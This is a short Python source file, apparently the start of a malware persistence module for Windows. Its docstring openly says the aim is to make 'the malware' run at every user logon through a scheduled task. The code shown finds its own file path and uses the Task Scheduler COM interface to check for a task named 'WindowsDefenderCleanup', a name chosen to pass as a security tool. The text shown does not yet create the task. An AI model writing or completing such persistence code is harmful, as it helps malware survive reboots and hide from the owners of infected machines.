"""
NAME: Persistence Module (Windows Scheduled Tasks)
Description: This module ensures the malware automatically executes every 
time the user logs into the system. It utilizes the Windows 'schtasks' 
utility to create a scheduled task pointing to the current executable. 
This allows the process to remain resilient against system reboots and 
unexpected shutdowns without requiring manual intervention.
"""

import os
import win32com.client # WINDOWS API 

#1. CHECK WHICH ROUTE THE MALWARE IS 

current_path = os.path.realpath(__file__)
print(current_path)

#2. CHECK IF THE TASK ALREADY EXISTS
def task(taskName): 
    scheduler = win32com.client.Dispatch("Schedule.Service")
    scheduler.Connect()

    root_folder = scheduler.GetFolder("\\") # Obtiene la carpeta raiz del Task Scheduler

    try:
        root_folder.GetTask(taskName) 
        return True
    except Exception:
        return False
print(task("WindowsDefenderCleanup"))

